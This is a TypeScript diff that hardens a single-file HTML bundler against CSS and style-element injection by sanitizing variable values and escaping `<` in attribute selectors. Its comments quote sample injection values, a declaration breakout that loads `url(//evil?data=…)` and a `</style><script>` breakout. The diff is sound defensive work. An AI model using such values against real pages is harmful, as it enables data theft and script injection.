@@ -1,6 +1,7 @@
 import { markFlattenedInnerRoot } from "../runtime/flattenedRoot";
 export { FLATTENED_INNER_ROOT_STRIP_ATTRS } from "../runtime/flattenedRoot";
 import { parseHostVariableValues, warnUnknownEnumValues } from "../runtime/getVariables";
+import { sanitizeCssValue } from "../runtime/applyVariableBindings";
 import { cssVariableName } from "../tokenSlug";
 import { readFileSync, existsSync } from "fs";
 import { resolve, relative, dirname, isAbsolute, sep } from "path";
@@ -389,8 +390,17 @@ function rewriteCssUrlsWithInlinedAssets(cssText: string, projectDir: string): s
   );
 }
 
+/**
+ * Selectors built here are serialized inside a `<style>` element, which is a RAW
+ * TEXT element: the tokenizer ends it at the first `</style` regardless of CSS
+ * context, and the serializer does not escape its content. Backslash and quote
+ * escaping keeps the selector's own string grammar valid; it does nothing about
+ * element termination, so `<` needs the CSS hex escape too. `\3c ` is legal
+ * wherever a string is, and matches the same attribute value, so selectors keep
+ * matching. The trailing space terminates the escape.
+ */
 function cssAttributeSelector(attr: string, value: string): string {
-  const escaped = value.replace(/\\/g, "\\\\").replace(/"/g, '\\"');
+  const escaped = value.replace(/\\/g, "\\\\").replace(/"/g, '\\"').replace(/</g, "\\3c ");
   return `[${attr}="${escaped}"]`;
 }
 
@@ -1136,24 +1146,34 @@ export async function bundleToSingleHtml(
 }
 
 /**
- * CSS-escape `<` in a variable value.
+ * Make a scalar variable value safe to bake into a stylesheet.
  *
- * These rules are emitted into a `<style>` element, and `<style>` is a RAW TEXT
- * element: HTML serialization does not escape its content, and the tokenizer
- * ends it at the first `</style` regardless of CSS string context. A variable
- * value carrying `</style><script>…` would therefore close the element and be
- * parsed as markup once the document is serialized (the producer's
- * `document.toString()`), turning a value into executable script.
+ * Two independent hazards, so two layers:
  *
- * `\3c ` is the CSS escape for `<`. It is valid in every value position —
- * including inside an unquoted `url()`, whose grammar allows escape sequences —
- * and resolves back to `<`, so rendering is unchanged. The trailing space is
- * consumed as part of the escape.
+ * 1. `sanitizeCssValue` is the runtime's own contract (`applyVariableBindings`,
+ *    and `docs/concepts/variables.mdx` promises it): a scalar folded into
+ *    `background: var(--x)` must not be able to close the declaration and open a
+ *    new rule (`red; } body { background-image: url(//evil?data=…) }`). The
+ *    compile path has to reach the same result as the runtime — a value the
+ *    runtime strips but a compile-time emit honours would make the rendered MP4
+ *    diverge from the preview.
+ * 2. These rules are then serialized inside a `<style>` element, which is a RAW
+ *    TEXT element: HTML serialization does not escape its content and the
+ *    tokenizer ends it at the first `</style`. `\3c ` is the CSS escape for `<`,
+ *    valid in every value position including inside an unquoted `url()`, and
+ *    resolves back to `<`, so rendering is unchanged. The trailing space is
+ *    consumed as part of the escape.
+ *
+ * The sanitizer already removes `<`, so today layer 2 is redundant for values
+ * and load-bearing only for the selector (`cssAttributeSelector`, which must
+ * preserve `<` to keep matching). It stays because the two layers answer to
+ * different rules: narrowing the scalar character set must not silently reopen
+ * an element-termination hole.
  *
  * Variable IDs need no equivalent: `cssVariableName` slugifies them.
  */
 function cssSafeVariableValue(value: string | number): string {
-  return String(value).replace(/</g, "\\3c ");
+  return sanitizeCssValue(String(value)).replace(/</g, "\\3c ");
 }
 
 /** One stylesheet rule defining primitive composition variables under `selector`. */
